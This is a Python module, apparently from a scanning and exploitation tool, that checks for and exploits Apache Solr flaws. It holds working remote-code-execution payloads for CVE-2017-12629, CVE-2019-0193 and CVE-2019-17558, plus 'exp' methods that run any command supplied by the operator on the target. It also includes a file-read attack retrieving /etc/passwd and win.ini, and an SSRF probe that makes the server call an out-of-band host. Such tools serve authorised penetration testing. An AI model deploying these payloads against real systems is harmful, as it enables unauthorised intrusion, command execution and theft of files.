#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
from thirdparty import requests
from thirdparty.requests.compat import urljoin
import threading
import http.client
from core.verify import verify
from module.md5 import random_md5
from module import globals
from urllib.parse import urlparse, quote
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.requests.compat import urljoin
from module.api.dns import dns_result, dns_request


class ApacheSolr:
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.r = "PoC_WaTinG"
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        # Change the url format to conform to the program
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        if r"https://" in self.url:
            self.url = "https://" + self.hostname + ":" + str(self.port)
        if r"http://" in self.url:
            self.url = "http://" + self.hostname + ":" + str(self.port)
        self.payload_cve_2017_12629 = '{"add-listener":{"event":"postCommit","name":"new_core","class":"solr.RunExecu' \
                                      'tableListener","exe":"sh","dir":"/bin/","args":["-c", "RECOMMAND"]}}'
        self.payload_cve_2019_0193 = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test" \
                                     "&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5B" \
                                     "CDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22RECOMMAND%22)%3B%0A++++++" \
                                     "++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++" \
                                     "++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%2" \
                                     "2XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3A" \
                                     "poc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
        self.payload_cve_2019_17558 = "/select?q=1&&wt=velocity&v.template=cus" \
                                      "tom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.for" \
                                      "Name(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27" \
                                      "java.lang.Character%27))+%23set($str=$x.class.forName(%27java.l" \
                                      "ang.String%27))+%23set($ex=$rt.getRuntime().exec(%27RECOMMAND%2" \
                                      "7))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach(" \
                                      "$i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read" \
                                      "()))%23end"

    def cve_2017_12629_poc(self):
        self.threadLock.acquire()
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        self.vul_info["prt_name"] = "Apache Solr: CVE-2017-12629"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = self.payload_cve_2017_12629.replace("RECOMMAND", "whoami")
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Apache Solr 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-12629"
        self.vul_info["vul_apps"] = "Solr"
        self.vul_info["vul_date"] = "2017-10-14"
        self.vul_info["vul_vers"] = "< 7.1.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Remote Code Execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Solr 是Apache开发的一个开源的基于Lucene的全文搜索服务器。其集合的配置方法" \
                                    "（config路径）可以增加和修改监听器，通过RunExecutableListener执行任意系统命令。"
        self.vul_info["cre_auth"] = "zhzyker"
        core_name = "null"
        new_core = random_md5()
        md = dns_request()
        cmd = "ping " + md
        payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", cmd).replace("new_core", new_core)
        payload2 = '[{"id": "test"}]'
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        headers_solr1 = {
            'Accept': "*/*",
            'User-Agent': self.ua,
            'Content-Type': "application/json"
        }
        headers_solr2 = {
            'Host': "localhost",
            'Accept-Language': "en",
            'User-Agent': self.ua,
            'Connection': "close",
            'Content-Type': "application/json"
        }
        try:
            request = requests.get(url_core, headers=headers_solr1, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            req = requests.post(self.url + "/solr/" + str(core_name) + "/config", data=payload1, headers=headers_solr1,
                                timeout=self.timeout, verify=False)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [newcore: " + new_core + "] "
            else:
                if request.status_code == 200 and core_name != "null" and core_name is not None:
                    self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["prt_info"] = "[maybe] [newcore: " + new_core + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2017_12629_exp(self, cmd):
        vul_name = "Apache Solr: CVE-2017-12629"
        core_name = "null"
        new_core = random_md5()
        payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", cmd).replace("new_core", new_core)
        payload2 = '[{"id": "test"}]'
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        headers_solr1 = {
            'Host': "localhost",
            'Accept': "*/*",
            'User-Agent': self.ua,
            'Connection': "close"
        }
        headers_solr2 = {
            'Host': "localhost",
            'Accept-Language': "en",
            'User-Agent': self.ua,
            'Connection': "close",
            'Content-Type': "application/json"
        }
        try:
            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            req = requests.post(self.url + "/solr/" + str(core_name) + "/config", data=payload1, headers=headers_solr1,
                                timeout=self.timeout, verify=False)
            request = requests.post(self.url + "/solr/" + str(core_name) + "/update", data=payload2,
                                        headers=headers_solr2, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(req).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2019_0193_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Solr: CVE-2019-0193"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2019_0193.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Apache Solr 搜索引擎中的命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2019-0193"
        self.vul_info["vul_apps"] = "Solr"
        self.vul_info["vul_date"] = "2019-10-16"
        self.vul_info["vul_vers"] = "< 8.2.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Remote Code Execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "在Apache solr的可选模块DatalmportHandler中的DIH配置是可以包含脚本，因此存在安全隐患，" \
                                    "在apache solr < 8.2.0版本之前DIH配置中dataconfig可以被用户控制"
        self.vul_info["cre_auth"] = "zhzyker"
        core_name = "null"
        md = random_md5()
        cmd = "echo " + md
        payload = self.payload_cve_2019_0193.replace("RECOMMAND", quote(cmd, 'utf-8'))
        solrhost = self.hostname + ":" + str(self.port)
        headers = {
            'Host': "" + solrhost,
            'User-Agent': self.ua,
            'Accept': "application/json, text/plain, */*",
            'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            'Accept-Encoding': "zip, deflate",
            'Referer': self.url + "/solr/",
            'Content-type': "application/x-www-form-urlencoded",
            'X-Requested-With': "XMLHttpRequest",
            'Connection': "close"
        }
        urlcore = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        try:
            request = requests.get(urlcore, headers=headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            urlconfig = self.url + "/solr/" + str(core_name) + "/admin/mbeans?cat=QUERY&wt=json"
            request = requests.get(urlconfig, headers=headers, timeout=self.timeout, verify=False)
            url_cmd = self.url + "/solr/" + str(core_name) + "/dataimport"
            request = requests.post(url_cmd, data=payload, headers=headers, timeout=self.timeout, verify=False)
            if request.status_code == 200 and core_name != "null":
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoC_MaYbE"
                self.vul_info["prt_info"] = "[maybe] [corename: " + url_cmd + "] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2019_17558_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Solr: CVE-2019-17558"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2019_17558.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Apache Solr Velocity template Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2019-17558"
        self.vul_info["vul_apps"] = "Solr"
        self.vul_info["vul_date"] = "2017-10-16"
        self.vul_info["vul_vers"] = "5.0.0 - 8.3.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Remote Code Execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "用户可以注入自定义模板，通过Velocity模板语言执行任意命令。"
        self.vul_info["cre_auth"] = "zhzyker"
        core_name = None
        md = dns_request()
        cmd = "ping " + md
        payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND", cmd)
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        try:
            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            url_api = self.url + "/solr/" + str(core_name) + "/config"
            headers_json = {'Content-Type': 'application/json', 'User-Agent': self.ua}
            set_api_data = """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """
            try:
                r = requests.post(url_api, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
                req = requests.get(self.url + "/solr/" + str(core_name) + payload_2, headers=self.headers,
                                   timeout=self.timeout, verify=False)
                req = dump.dump_all(req).decode('utf-8', 'ignore')
                r = dump.dump_all(r).decode('utf-8', 'ignore')
            except:
                req = "timeout"
                r = "timeout"
            if dns_result(md):
                self.vul_info["vul_data"] = req
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [corename: " + self.url + "/solr/" + core_name + " ]"
                verify.scan_print(self.vul_info)
            elif self.vul_info["prt_resu"] != "PoCSuCCeSS" and core_name is not None:
                self.vul_info["vul_data"] = r
                self.vul_info["prt_resu"] = "PoC_MaYbE"
                self.vul_info["prt_info"] = "[maybe] [corename: " + self.url + "/solr/" + core_name + " ]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def time_2021_0318_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Solr: time-2021-03-18"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = ""
        self.vul_info["vul_name"] = "Apache Solr Arbitrary file reading"
        self.vul_info["vul_numb"] = "time-2021-03-18"
        self.vul_info["vul_apps"] = "Solr"
        self.vul_info["vul_date"] = "2021-03-17"
        self.vul_info["vul_vers"] = "all"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Arbitrary file read"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Arbitrary file read"
        self.vul_info["cre_auth"] = "zhzyker"
        core_name = None
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        try:
            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            set_property = self.url + "/solr/" + str(core_name) + "/config"
            headers_json = {'Content-Type': 'application/json', 'Connection': 'colse', 'User-Agent': self.ua}
            data = r'''{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'''
            r = requests.post(set_property, data=data, headers=headers_json, timeout=self.timeout, verify=False)
            if r.status_code == 200 and r"responseHeader" in r.text:
                rce_url = self.url + "/solr/" + str(core_name) + "/debug/dump?param=ContentStreams"
                headers = {
                    'User-Agent': self.ua,
                    'Connection': 'colse',
                    'Content-Type': 'multipart/form-data; boundary=------------------------e602c3e1a193d599'
                }
                data = '--------------------------e602c3e1a193d599\r\n'
                data += 'Content-Disposition: form-data; name="stream.url"\r\n'
                data += '\r\n'
                data += 'file:///etc/passwd\r\n'
                data += '--------------------------e602c3e1a193d599--\r\n'
                req = requests.post(rce_url, data=data, headers=headers, timeout=self.timeout, verify=False)
                if r"root:x:0:0:root" in req.text and r"/root:/bin/bash" in req.text and r"/usr/sbin/nologin" in req.text:
                    if r"daemon:" in req.text and req.status_code == 200:
                        self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                        self.vul_info["prt_resu"] = "PoCSuCCeSS"
                        self.vul_info["prt_info"] = "[file read] [os:linux] [corename: " + self.url + "/solr/" + core_name + " ]"
                else:
                    data = '--------------------------e602c3e1a193d599\r\n'
                    data += 'Content-Disposition: form-data; name="stream.url"\r\n'
                    data += '\r\n'
                    data += 'file:///C:windows/win.ini\r\n'
                    data += '--------------------------e602c3e1a193d599--\r\n'
                    req = requests.post(rce_url, data=data, headers=headers, timeout=self.timeout, verify=False)
                    if r"app support" in req.text and r"fonts" in req.text and r"mci extensions" in req.text:
                        if r"files" in req.text and req.status_code == 200:
                            self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                            self.vul_info["prt_resu"] = "PoCSuCCeSS"
                            self.vul_info["prt_info"] = "[file read] [os:windows] [corename: " + self.url + "/solr/" + core_name + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2019_17558_exp(self, cmd):
        vul_name = "Apache Solr: CVE-2019-17558"
        core_name = None
        payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND", cmd)
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        try:
            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except AttributeError:
                pass
            url_api = self.url + "/solr/" + str(core_name) + "/config"
            headers_json = {'Content-Type': 'application/json', 'User-Agent': self.ua}
            set_api_data = """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """
            request = requests.post(url_api, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
            request = requests.get(self.url + "/solr/" + str(core_name) + payload_2, headers=self.headers,
                                   timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2021_27905_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Solr: CVE-2021-27905"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Apache Solr Replication handler SSRF"
        self.vul_info["vul_numb"] = "CVE-2021-27905"
        self.vul_info["vul_apps"] = "Solr"
        self.vul_info["vul_date"] = "2021-04-14"
        self.vul_info["vul_vers"] = "7.0.0-7.7.3, 8.0.0-8.8.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "SSRF"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。"
        self.vul_info["cre_auth"] = "zhzyker"
        core_name = None
        dns = dns_request()
        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
        try:
            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
            try:
                core_name = list(json.loads(request.text)["status"])[0]
            except:
                pass
            payload = "/solr/re_core_name/replication?command=fetchindex&masterUrl" \
                      "=http://re_dns_domain/&wt=json&httpBasicAuthUser=" \
                      "&httpBasicAuthPassword=".replace("re_core_name", core_name).replace("re_dns_domain", dns)
            url_ssrf = urljoin(self.url, payload)
            r = requests.get(url_ssrf, headers=self.headers, timeout=self.timeout, verify=False)
            if dns in dns_result(dns):
                self.vul_info["vul_payd"] = url_ssrf
                self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[ssrf] [dns] [corename: " + self.url + "/solr/" + core_name + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()
